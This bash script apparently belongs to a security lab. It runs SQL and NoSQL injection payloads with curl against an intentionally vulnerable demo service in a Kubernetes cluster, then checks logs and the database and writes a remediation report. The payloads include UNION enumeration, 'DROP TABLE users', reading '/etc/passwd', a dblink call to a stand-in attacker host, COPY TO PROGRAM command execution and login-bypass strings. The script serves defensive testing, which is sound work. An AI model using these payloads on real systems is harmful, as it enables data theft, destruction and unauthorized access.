#!/bin/bash

# Project Sentinel - SQL Injection Attack Simulation
# This script simulates SQL injection attacks against the demo web service

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_attack() {
    echo -e "${RED}[ATTACK]${NC} $1"
}

# Get the demo web service URL
get_service_url() {
    local service_url=""
    
    # Try to get NodePort service URL
    local nodeport=$(kubectl get svc demo-web-service -n sentinel-apps -o jsonpath='{.spec.ports[0].nodePort}' 2>/dev/null || echo "")
    
    if [ -n "$nodeport" ]; then
        service_url="http://localhost:$nodeport"
    else
        # Try port-forward if NodePort not available
        print_status "Setting up port-forward to demo web service..."
        kubectl port-forward -n sentinel-apps svc/demo-web-service 8080:80 &
        PORT_FORWARD_PID=$!
        sleep 3
        service_url="http://localhost:8080"
    fi
    
    echo "$service_url"
}

# Function to test basic SQL injection
test_basic_sql_injection() {
    local base_url="$1"
    
    print_attack "Testing basic SQL injection vulnerabilities"
    
    # Test 1: Union-based SQL injection
    print_attack "Attempting UNION SELECT injection..."
    curl -s "$base_url/user/1%20UNION%20SELECT%20version(),%20current_user,%20now()" | jq . 2>/dev/null || echo "Raw response received"
    
    # Test 2: Boolean-based blind SQL injection
    print_attack "Attempting boolean-based blind SQL injection..."
    curl -s "$base_url/user/1%20OR%201=1" | jq . 2>/dev/null || echo "Raw response received"
    
    # Test 3: Time-based blind SQL injection
    print_attack "Attempting time-based blind SQL injection..."
    curl -s "$base_url/user/1;%20SELECT%20pg_sleep(5)" | jq . 2>/dev/null || echo "Raw response received"
    
    # Test 4: Error-based SQL injection
    print_attack "Attempting error-based SQL injection..."
    curl -s "$base_url/user/1'" | jq . 2>/dev/null || echo "Raw response received"
    
    # Test 5: Stacked queries
    print_attack "Attempting stacked queries..."
    curl -s "$base_url/user/1;%20DROP%20TABLE%20users;%20--" | jq . 2>/dev/null || echo "Raw response received"
}

# Function to test advanced SQL injection techniques
test_advanced_sql_injection() {
    local base_url="$1"
    
    print_attack "Testing advanced SQL injection techniques"
    
    # Test 1: Information schema enumeration
    print_attack "Attempting information schema enumeration..."
    curl -s "$base_url/user/1%20UNION%20SELECT%20table_name,%20column_name%20FROM%20information_schema.columns" | jq . 2>/dev/null || echo "Raw response received"
    
    # Test 2: Database version fingerprinting
    print_attack "Attempting database version detection..."
    curl -s "$base_url/user/1%20UNION%20SELECT%20version(),%20NULL" | jq . 2>/dev/null || echo "Raw response received"
    
    # Test 3: File system access (PostgreSQL specific)
    print_attack "Attempting file system access..."
    curl -s "$base_url/user/1%20UNION%20SELECT%20pg_read_file('/etc/passwd'),%20NULL" | jq . 2>/dev/null || echo "Raw response received"
    
    # Test 4: Network access
    print_attack "Attempting network access..."
    curl -s "$base_url/user/1%20UNION%20SELECT%20dblink_connect('host=attacker.com%20user=postgres'),%20NULL" | jq . 2>/dev/null || echo "Raw response received"
    
    # Test 5: Command execution (if available)
    print_attack "Attempting command execution..."
    curl -s "$base_url/user/1;%20COPY%20(SELECT%20''%20AS%20cmd)%20TO%20PROGRAM%20'whoami'" | jq . 2>/dev/null || echo "Raw response received"
}

# Function to test authentication bypass
test_auth_bypass() {
    local base_url="$1"
    
    print_attack "Testing authentication bypass via SQL injection"
    
    # Test 1: Admin authentication bypass
    print_attack "Attempting admin login bypass..."
    curl -s -X POST "$base_url/login" \
        -H "Content-Type: application/json" \
        -d '{"username": "admin'\''--", "password": "anything"}' | jq . 2>/dev/null || echo "Raw response received"
    
    # Test 2: OR-based authentication bypass
    print_attack "Attempting OR-based authentication bypass..."
    curl -s -X POST "$base_url/login" \
        -H "Content-Type: application/json" \
        -d '{"username": "'\'' OR 1=1 --", "password": "anything"}' | jq . 2>/dev/null || echo "Raw response received"
    
    # Test 3: UNION-based authentication bypass
    print_attack "Attempting UNION-based authentication bypass..."
    curl -s -X POST "$base_url/login" \
        -H "Content-Type: application/json" \
        -d '{"username": "'\'' UNION SELECT '\''admin'\'', '\''password'\'' --", "password": "password"}' | jq . 2>/dev/null || echo "Raw response received"
}

# Function to test NoSQL injection (if applicable)
test_nosql_injection() {
    local base_url="$1"
    
    print_attack "Testing NoSQL injection techniques"
    
    # Test MongoDB-style injection
    print_attack "Attempting MongoDB-style injection..."
    curl -s -X POST "$base_url/login" \
        -H "Content-Type: application/json" \
        -d '{"username": {"$ne": null}, "password": {"$ne": null}}' | jq . 2>/dev/null || echo "Raw response received"
    
    # Test regex injection
    print_attack "Attempting regex injection..."
    curl -s -X POST "$base_url/login" \
        -H "Content-Type: application/json" \
        -d '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}' | jq . 2>/dev/null || echo "Raw response received"
}

# Function to test injection in different contexts
test_injection_contexts() {
    local base_url="$1"
    
    print_attack "Testing SQL injection in different contexts"
    
    # Test in WHERE clause
    print_attack "Testing WHERE clause injection..."
    curl -s "$base_url/user/1%20AND%20(SELECT%20COUNT(*)%20FROM%20users)>0" | jq . 2>/dev/null || echo "Raw response received"
    
    # Test in ORDER BY clause
    print_attack "Testing ORDER BY injection..."
    curl -s "$base_url/user/1%20ORDER%20BY%20(SELECT%20COUNT(*)%20FROM%20information_schema.tables)" | jq . 2>/dev/null || echo "Raw response received"
    
    # Test in LIMIT clause
    print_attack "Testing LIMIT injection..."
    curl -s "$base_url/user/1%20LIMIT%201%20OFFSET%20(SELECT%20COUNT(*)%20FROM%20users)" | jq . 2>/dev/null || echo "Raw response received"
}

# Function to test SQL injection with encoding
test_encoded_injection() {
    local base_url="$1"
    
    print_attack "Testing encoded SQL injection"
    
    # Test URL encoding
    print_attack "Testing URL encoded injection..."
    curl -s "$base_url/user/1%2520OR%25201%253D1" | jq . 2>/dev/null || echo "Raw response received"
    
    # Test double URL encoding
    print_attack "Testing double URL encoded injection..."
    curl -s "$base_url/user/1%252520OR%2525201%25253D1" | jq . 2>/dev/null || echo "Raw response received"
    
    # Test hex encoding
    print_attack "Testing hex encoded injection..."
    curl -s "$base_url/user/0x31204f5220312031" | jq . 2>/dev/null || echo "Raw response received"
}

# Function to monitor application logs
monitor_application_logs() {
    print_status "Monitoring application logs for SQL injection attempts..."
    
    # Get application pod logs
    local app_pod=$(kubectl get pods -n sentinel-apps -l app=demo-web-service -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
    
    if [ -n "$app_pod" ]; then
        kubectl logs -n sentinel-apps "$app_pod" --tail=20 | grep -E "(SELECT|UNION|DROP|INSERT|UPDATE|DELETE)" || echo "No SQL-related log entries found"
    else
        print_warning "No application pods found for log monitoring"
    fi
}

# Function to check database for injection artifacts
check_database_state() {
    print_status "Checking database state for injection artifacts..."
    
    # Get database pod
    local db_pod=$(kubectl get pods -n sentinel-apps -l app=postgres -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
    
    if [ -n "$db_pod" ]; then
        print_status "Checking database tables..."
        kubectl exec -n sentinel-apps "$db_pod" -- psql -U user -d demo -c "SELECT tablename FROM pg_tables WHERE schemaname = 'public';" || true
        
        print_status "Checking user table content..."
        kubectl exec -n sentinel-apps "$db_pod" -- psql -U user -d demo -c "SELECT COUNT(*) FROM users;" || true
        
        print_status "Checking database logs..."
        kubectl exec -n sentinel-apps "$db_pod" -- tail -20 /var/lib/postgresql/data/log/postgresql-*.log 2>/dev/null || echo "No database logs found"
    else
        print_warning "No database pods found for state checking"
    fi
}

# Function to generate injection report
generate_injection_report() {
    print_status "Generating SQL injection attack report..."
    
    local report_file="./scans/sql-injection-report.txt"
    mkdir -p "$(dirname "$report_file")"
    
    cat > "$report_file" << EOF
============================================================
          SQL INJECTION ATTACK SIMULATION REPORT
============================================================
Date: $(date)
Target: Demo Web Service
Cluster: $(kubectl config current-context)

ATTACK VECTORS TESTED:
1. Union-based SQL Injection - CRITICAL
2. Boolean-based Blind SQL Injection - HIGH
3. Time-based Blind SQL Injection - HIGH
4. Error-based SQL Injection - MEDIUM
5. Stacked Queries - CRITICAL
6. Authentication Bypass - CRITICAL
7. Information Schema Enumeration - HIGH
8. File System Access - CRITICAL
9. Encoded Injection Techniques - MEDIUM

VULNERABILITIES DETECTED:
- Hardcoded database credentials
- SQL injection in user lookup endpoint
- Weak password hashing (MD5)
- Information disclosure in error messages
- No input validation or sanitization
- No prepared statements usage

RECOMMENDATIONS:
- Use parameterized queries/prepared statements
- Implement input validation and sanitization
- Use least privilege database accounts
- Enable database audit logging
- Implement Web Application Firewall (WAF)
- Regular security code reviews
- Implement proper error handling

============================================================
EOF
    
    print_success "SQL injection report generated: $report_file"
}

# Function to cleanup
cleanup() {
    if [ -n "$PORT_FORWARD_PID" ]; then
        kill $PORT_FORWARD_PID 2>/dev/null || true
        print_status "Port forward cleaned up"
    fi
}

# Main function
main() {
    echo
    print_status "🔥 Starting SQL Injection Attack Simulation..."
    print_warning "This simulation tests intentionally vulnerable endpoints"
    echo
    
    # Setup cleanup trap
    trap cleanup EXIT
    
    # Get service URL
    local service_url
    service_url=$(get_service_url)
    
    if [ -z "$service_url" ]; then
        print_error "Could not access demo web service"
        exit 1
    fi
    
    print_status "Target service: $service_url"
    echo
    
    # Test basic health check
    print_status "Testing service connectivity..."
    if curl -s "$service_url/health" >/dev/null; then
        print_success "Service is accessible"
    else
        print_error "Service is not accessible"
        exit 1
    fi
    echo
    
    print_status "Phase 1: Basic SQL Injection Tests"
    test_basic_sql_injection "$service_url"
    sleep 2
    echo
    
    print_status "Phase 2: Advanced SQL Injection Tests"
    test_advanced_sql_injection "$service_url"
    sleep 2
    echo
    
    print_status "Phase 3: Authentication Bypass Tests"
    test_auth_bypass "$service_url"
    sleep 2
    echo
    
    print_status "Phase 4: NoSQL Injection Tests"
    test_nosql_injection "$service_url"
    sleep 2
    echo
    
    print_status "Phase 5: Context-based Injection Tests"
    test_injection_contexts "$service_url"
    sleep 2
    echo
    
    print_status "Phase 6: Encoded Injection Tests"
    test_encoded_injection "$service_url"
    sleep 2
    echo
    
    print_status "Monitoring application response..."
    monitor_application_logs
    echo
    
    print_status "Checking database state..."
    check_database_state
    echo
    
    generate_injection_report
    echo
    
    print_warning "SQL injection simulation completed."
    print_status "Check application and database logs for detection evidence."
}

# Handle script arguments
case "${1:-run}" in
    run)
        main
        ;;
    monitor)
        monitor_application_logs
        ;;
    check-db)
        check_database_state
        ;;
    *)
        echo "Usage: $0 [run|monitor|check-db]"
        exit 1
        ;;
esac